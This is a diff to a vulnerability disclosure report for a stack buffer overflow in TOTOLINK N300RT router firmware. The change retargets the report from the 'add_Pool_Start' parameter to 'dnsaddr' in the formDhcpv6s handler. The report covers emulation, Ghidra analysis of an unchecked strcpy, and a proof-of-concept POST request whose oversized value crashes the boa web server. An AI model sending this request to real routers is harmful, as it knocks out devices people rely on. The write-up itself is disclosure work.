@@ -1,11 +1,11 @@
 ## **Description**
 
-A buffer overflow vulnerability was discovered in the TOTOLINK firmware N300RT-Ad-V4.0.0-B20211109.1137. The vulnerability arises from the improper input validation of the `'add_Pool_Start'` parameter in the 'formDhcpv6s' interface of the file boa.
+A buffer overflow vulnerability was discovered in the TOTOLINK firmware N300RT-Ad-V4.0.0-B20211109.1137. The vulnerability arises from the improper input validation of the `'dnsaddr'` parameter in the 'formDhcpv6s' interface of the file boa.
 
 ## ​**Affected Product**
 
 - ​**Brand**: TOTOLINK
-- ​**Product**: N300RT-Ad
+- ​**Product**: N300RT
 - ​**Version**: V4.0.0-B20211109.1137
 
 The firmware can be downloaded from the official website.  
@@ -21,16 +21,16 @@ sudo ./run.sh -d totolink ../FIRMWARE/TOTOLINK-N300RT-Ad-V4.0.0-B20211109.1137.w
 - ​**Password**: `admin`
 
 The result of the simulation is as follows: 
-![sim_res](work_record/TOTOLINK/N300RT_ad/4/img/sim_res.png)
+![sim_res](work_record/TOTOLINK/N300RT_ad/6/img/sim_res.png)
 
 ## ​**Vulnerability Analysis**
 
 ### ​**Key Vulnerable Code**
 
 Using ghidra we known that the vulnerability code in function 'FUN_0044f0b8' is below:
-![vulner_code.png](work_record/TOTOLINK/N300RT_ad/4/img/vulner_code.png)
+![vulner_code.png](work_record/TOTOLINK/N300RT_ad/6/img/vulner_code.png)
 Because of the problem of ghidra decompilation, the code in `FUN_00402610()` should actually use the strcpy function to copy the parameters obtained by POST to an address.
-![vulner_code_1.png](work_record/TOTOLINK/N300RT_ad/4/img/vulner_code_1.png)
+![vulner_code_1.png](work_record/TOTOLINK/N300RT_ad/6/img/vulner_code_1.png)
 - ​**web_get_var** retrieves POST parameters.
 - **strcpy()** is used without length checks, leading to a ​buffer overflow.​
 
@@ -52,8 +52,8 @@ Connection: close
 Referer: http://192.168.0.1/tcpipwan.htm
 Upgrade-Insecure-Requests: 1  
   
-enabledpchv6s=1&add_Pool_Start=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+enabledpchv6s=1&dnsaddr=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ```
 
 After the request the `boa` process will crash.
-![result](work_record/TOTOLINK/N300RT_ad/4/img/result.png)
+![result](work_record/TOTOLINK/N300RT_ad/6/img/result.png)
